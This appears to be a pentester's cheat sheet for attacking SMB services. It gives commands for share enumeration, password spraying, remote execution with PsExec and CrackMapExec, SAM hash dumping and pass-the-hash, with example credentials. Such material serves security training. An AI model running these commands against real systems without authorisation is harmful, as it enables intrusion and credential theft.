# SMB
## Enumeration and exploitation
 1. [SMB Access from Linux Cheat Sheet by SANS](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
 2. [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
 3. [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
 4. [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
 5. [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation
 6. [Impacket atexec](https://github.com/fortra/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
 7. [Responder](https://github.com/lgandx/Responder) - is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.
 8. [Impacket SMBExec](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
 9. [Impacket PsExec](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
 10. [CrackMapExec - CME](https://github.com/byt3bl33d3r/CrackMapExec)
     1. [Old documentation](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials)


```
sudo nmap -sV -sC -p139,445 $rhost
```

## File Share
Using smbclient, we can display a list of the server's shares with the option -L, and using the option -N, we tell smbclient to use the null session.
```
smbclient -N -L //$rhost
```
Smbmap is another tool that helps us enumerate network shares and access associated permissions. An advantage of smbmap is that it provides a list of permissions for each shared folder.
```
smbmap -H $rhost
```
Using smbmap with the -r or -R (recursive) option, one can browse the directories:
```
smbmap -H $rhost -r $folder
smbmap -H $rhost --download "full path\...\filename.extension" # To download a file
smbmap -H $rhost --upload filename.extension "full path\...\filename.extension" # To upload a file
```

## Remote Procedure Call (RPC)

```
rpcclient -U'%' $rhost
```
Enum4linux is another utility that supports null sessions, and it utilizes nmblookup, net, rpcclient, and smbclient to automate some common enumeration from SMB targets such as:
 1. Workgroup/Domain name
 2. Users information
 3. Operating system information
 4. Groups information
 5. Shares Folders
 6. Password policy information
```
./enum4linux-ng.py $rhost -A -C
```
## Brute Forcing and Password Spray
```
crackmapexec smb $rhost -u $wordlist -p 'some_password' --local-auth
```
## Impacket PsExec

Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom). To use impacket-psexec, we need to provide the domain/username, the password, and the IP address of our target machine.

```
impacket-psexec $username:'$password'@$rhost
```

## CrackMapExec

One advantage of CrackMapExec is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, smb, the IP address or IP address range, the option -u for username, and -p for the password, and the option -x to run cmd commands or uppercase -X to run PowerShell commands.
 
```
crackmapexec smb $rhost -u $username -p 'some_password' -x '$command' --exec-method smbexec
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec # example
```
**Note:** *If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.* .

## Enumerating Logged-on Users

```
crackmapexec smb $rhost/$subnet_mask -u $username -p '$password' --loggedon-users
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users # example
```

## Extract Hashes from SAM Database

The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:
 * Authenticate as another user.
 * Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
 * Pass The Hash.

```
crackmapexec smb $rhost -u $username -p '$password' --sam
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam # Example
```
## Pass-the-Hash (PtH)

If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any Impacket tool, SMBMap, CrackMapExec, among other tools. Here is an example of how this would work with CrackMapExec:

```
crackmapexec smb $rhost -u $username -H $hash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE # Example
```

